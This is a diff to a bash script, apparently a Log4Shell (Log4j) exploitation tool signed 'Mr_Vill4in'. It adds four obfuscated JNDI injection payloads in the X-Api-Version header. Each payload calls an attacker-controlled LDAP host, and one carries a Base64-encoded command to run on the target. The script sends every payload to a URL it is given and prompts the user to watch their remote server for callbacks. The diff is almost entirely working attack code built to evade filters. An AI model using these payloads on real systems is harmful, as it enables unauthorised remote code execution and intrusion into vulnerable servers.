@@ -14,12 +14,22 @@ echo -e " ${RED}                       #| Coded by Mr_Vill4in || Version: 1.0   
 echo -e "${STOP}"
 
 
+
 url=$1
 dns=$2
+payload=("X-Api-Version: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://$dns/a" "X-Api-Version: \${jndi:ldap://$dns/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}" "X-Api-Version: \${jndi:\${lower:l}\${lower:d}a\${lower:p}://$dns/a" "X-Api-Version: \${\${env:TEST:-j}ndi\${env:TEST:-:}\${env:TEST:-l}dap\${env:TEST:-:}//$dns/a")
 echo -e "${Cyan}Log4j Testing on = ${GREEN} $1 ${STOP}\n"
 echo -e "${Cyan}your Remote server =${GREEN} $2 ${STOP}\n"
 echo ""
-curl "$1" -H 'X-Api-Version: ${jndi:ldap://$2/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}' -s
+#curl "$1" -H ${!payload[@]} -s
+for i in "${payload[0]}"; do curl $url -H $i -s ; done
+echo -e "${Cyan}your Current Payload is =${GREEN} ${payload[0]} ${STOP}\n"
+for i in "${payload[1]}"; do curl $url -H $i -s ; done
+echo -e "${Cyan}your Current Payload is =${GREEN} ${payload[1]} ${STOP}\n"
+for i in "${payload[2]}"; do curl $url -H $i -s ; done
+echo -e "${Cyan}your Current Payload is =${GREEN} ${payload[2]} ${STOP}\n"
+for i in "${payload[3]}"; do curl $url -H $i -s ; done
+echo -e "${Cyan}your Current Payload is =${GREEN} ${payload[3]} ${STOP}\n"
 
 echo -e " ${STOP}\n"
 echo -e "${GREEN}Please Check your Remote Server,${STOP}\n"
